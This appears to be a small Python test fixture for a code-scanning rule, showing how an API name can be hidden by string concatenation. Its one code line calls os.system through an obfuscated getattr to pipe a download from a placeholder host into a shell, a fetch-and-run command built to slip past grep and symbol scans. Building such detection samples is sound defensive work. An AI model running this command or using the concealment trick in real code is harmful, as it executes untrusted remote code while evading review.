"""Concealment shape: API name assembled from string literals.

The import_module target is resolved inline with a literal-plus-literal
fragment ("sy" + "stem"), keeping the real API name out of grep and the
symbol scan. This is the shape getattr-inline-import-module-concat must
still catch now that literal-prefix-plus-variable dispatch no longer
fires it.
"""
from importlib import import_module

getattr(import_module("os"), "sy" + "stem")("curl https://example.invalid/x | sh")
